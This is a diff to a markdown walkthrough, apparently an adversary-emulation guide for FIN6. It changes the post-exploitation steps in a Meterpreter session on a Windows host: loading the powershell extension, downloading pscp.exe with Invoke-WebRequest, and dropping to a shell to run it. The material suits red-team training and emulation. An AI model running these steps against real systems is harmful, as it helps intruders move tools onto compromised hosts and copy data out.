@@ -454,13 +454,9 @@ service ssh status
 Now, let's get back to the meterpreter> console and load powershell module:
 
 ```bash
-meterpreter > shell
-Process 6388 created.
-Channel 1 created.
-Microsoft Windows [Version 10.0.17763.3650]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-C:\Users\Administrator\Downloads>
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_shell
 ```
 
 Then start to download `PSCP` using the following command:
@@ -469,6 +465,11 @@ Then start to download `PSCP` using the following command:
 Invoke-WebRequest -Uri https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe -OutFile .\pscp.exe
 ```
 
+Once downloaded, exit to the powershell module since we need to load the cmd or shell module in order for `PSCP` to execute properly:
+
+```bash
+meterpreter > shell
+```
 
 FIN6
 FIN6
